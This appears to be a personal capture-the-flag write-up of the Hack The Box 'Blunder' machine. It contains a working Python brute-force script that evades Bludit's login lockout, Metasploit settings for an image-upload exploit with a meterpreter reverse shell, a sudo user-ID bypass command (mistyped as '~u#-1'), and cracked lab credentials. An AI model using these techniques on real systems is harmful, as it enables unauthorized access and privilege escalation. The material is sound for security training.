# Blunder - Linux - Easy

## User - *this was terrible*

### **Starting Off**

As always, I started off with running `nmap -sCV 10.10.10.191 > nmap.txt` to save the output of our scan for future reference.\
Found ftp and https open, so I navigated to the website and was greeted with a blog page.

I started up dirbuster, and chose to scan files from the dirbuster medium list with the extension of .php

---

### **Finding Exploits**

As usual, I googled `Bludit CMS exploit` and was first greeted with an [exploit](https://www.exploit-db.com/exploits/46060) that utilized the admin privileges to upload files.\
*Unfortunately, this was unable for our use as there was no place to upload files, as dirbuster suggeseted.*

Moving on the next result, I found an [exploit](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113) that used similar logic, but instead abused the admin privileges to upload images. From what I understood, this CVE could upload images and imbed any command a malicious actor wanted to.\
*I saved this one as the key exploit, because `http://10.10.10.191/bl-kernel/ajax/upload-images.php` existed.*

Thankfully, metasploit had this exploit as `CVE-2019-16113`, allowing me to utilize metasploit for a quick-and-easy, 1-2 exploit. **Unfortunately, I was wrong.**\
The metasploit module required a username and password in the form of `BLUDITPASS` and `BLUDITUSER`

dirbuster had returned to me an admin login page as `http://10.10.10.191/admin/login`, allowing user access to the information panel for bludit. My first step was to use burpsuite to capture a request, set up in intruder, define the username area to be targeted with a fuzz list, define the password area to be targeted with a simple CeWL output (`cewl -w output.txt 10.10.10.191`), and bruteforce. *htb does not like bruteforcing, and this never ended up working*


<!-- i think you can use metasploit and the upload image exploit but i cant tell, no mentions of user or admin anywhere

I found thumbnails that have been modified recently today. downloaded but is gibberish -->
I found this comment on the hackthebox forums for Blunder, which helped me reduce my wastage of time.
```
Login - Try some fuzzing to get the first thing you need – the "usual" wordlist might not have what you need. Specifying extensions is important. The second thing you need is already in front of you.
User - CVE
Root - Check your capabilities
```

<!--okay after 4 hours of getting nowhere, here we are. -->

I ran dirbuster again with the extensions of `.php` and `.txt` and with recursive mode off, and thankfully found `todo.txt` which lists the following:
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
*BINGO*, we now have a potential username of fergus

Even though htb does not support bruteforcing as a means of gaining access, I googled `bludit brute force exploit` and found a [bludit brute force program written in python](https://rastating.github.io/bludit-brute-force-mitigation-bypass/). I downloaded the POC and replaced some of the functionality to work in our case.

```
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

with open('output.txt','r') as f:
    for i in f:
        wordlist.append(i.strip())


for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```
---

### **Gaining Access**

The output of the exploit returned `fergus:RolandDeschain` as a login, meaning that I could now use the metasploit module found earlier.
```
msf5 exploit(linux/http/bludit_upload_images_exec)
set payload php/meterpreter/reverse_tcp
set BLUDITUSER fergus
set BLUDITPASS RolandDeschain
set RHOSTS 10.10.10.191
set LHOST 10.10.14.3 #replace this with your own ip
set LPORT 3333 #any 4 random numbers here will work
exploit
```

After I logged in as `fergus`, I was able to look around the box and find a file within /var/www/bludit-3.9.2 called `users.php`, showing me an administrator account with both hash and salt, which is impossible to crack and get a password.\
Running `ps` gave me more possible users, as I found:
- shaun
- hugo
- whoopsie
- message+
- kernoops
- rtkit

I figured out that `whoopsie`, `message+`, `kernoops`, and `rtkit` were all normal system users with no meaning, so I targeted `shaun` and `hugo`. Unfortunately, this led me to waste another hour trying to find some sort of file that could possibly contain their information. I found a second bludit service in the form of `bludit-3.10.0a` with another file called `users.php` which returned the following:
```
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",  faca404fd5c0a31cf1897b823c695c85cffeb98d
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
Thankfully, the hash was a well-known one, as hashstation it in their databases. We now had a user `Hugo` with the password `Password120`. 

The metasploit module spawned a meterpreter shell, so I dropped into a bash shell and ran `su - hugo` to switch to hugo, and put in the password `Password120`, allowing us to navigate to /home/hugo and cat user.txt

3d10e3a03e90fc82ae2e20485f6126c4


---

## Root - *this was fun*

I was taught how to upgrade your shell by another htb user, stoneric (thank you).

From the same shell, I ran the following python command in order to "upgrade" my shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Now we want to check what possible sudo privileges that Hugo has, if any with the command:
```
$ sudo -l

Matching Defaults entries for hugo on blunder:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
        (ALL, !root) /bin/bash

```

A simple google search of `(ALL, !root) /bin/bash` yielded the result that I should be able to gain root privileges with the following command:
```
sudo ~u#-1 /bin/bash
```

`whoami` now shows that we are successfully a root user, allowing us to change directories into /root and cat root.txt, giving usu our root hash.

07570cc298695624106fc443164a4e57

---
## What did I learn?
- How to use an exploit from metaspoit and setup variables required
- How to use BurpSuite
- How to upgrade a reverse shell with a python one-liner
- How to use CeWL to generate a list of possible passwords/usernames
- Sudo rules and how they can be overcome
